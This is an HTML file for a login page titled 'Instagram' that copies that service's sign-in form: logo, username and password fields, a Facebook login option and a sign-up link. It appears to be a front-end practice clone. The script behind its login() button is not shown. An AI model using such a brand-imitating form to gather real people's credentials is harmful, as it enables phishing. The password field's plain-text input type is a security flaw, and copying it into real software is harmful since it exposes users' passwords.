<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="login.css">
    <script src="https://kit.fontawesome.com/f2ba1724e3.js" crossorigin="anonymous"></script>
    <script src="intragram.js"></script>
    <title>Instagram</title>
</head>
<body>
    <div class="container">
        <div class="login">
            <div class="logo">
                <img src="download1.png" alt="">
            </div>
            <div class="sign-in">
                <div class="div">
                    <input id="username" placeholder="Phone number, username or email address" type="text">
                </div>
                <div class="div">
                    <input id="password" placeholder="Password" type="text">
                </div>
                <div class="div">
                    <button onclick="login()">Log in</button>
                </div>
                <div class="div">
                    <div class="c">
                        <hr>
                    </div>
                    <p>OR</p>
                    <div class="c">
                        <hr>
                    </div>
                </div>
                <div class="div">
                    <i class="fa-brands fa-square-facebook"></i>
                    <p>
                        Log in with facebook
                    </p>
                </div>
                <div class="div">
                    <p>
                        Forgotten your password?
                    </p>
                </div>
            </div>
        </div>
        <div class="redirect">
            <p>
                Dont have an account? <a href="register.html" style="text-decoration: none;color: rgb(135, 173, 250); font-weight: bold;"> Sign up</a>
            </p>
        </div>
    </div>
</body>
</html>
